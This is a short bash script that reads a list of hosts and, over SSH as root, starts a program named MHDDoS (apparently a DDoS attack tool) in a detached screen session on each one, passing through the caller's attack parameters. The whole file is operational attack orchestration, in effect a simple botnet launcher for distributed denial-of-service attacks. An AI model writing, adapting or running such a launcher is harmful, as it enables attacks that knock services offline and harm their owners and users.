#!/bin/bash
CURRENT_DIR=$(dirname "$0")

SSH_HOSTS=$(cat  $CURRENT_DIR/hosts.txt |tr "\n" " ")
PARAMETHERS="$@"

for HOST in $SSH_HOSTS; do
    bash "$CURRENT_DIR/runoverssh" root "screen -d -m python3 /root/MHDDoS/start.py $PARAMETHERS" "$HOST"
done

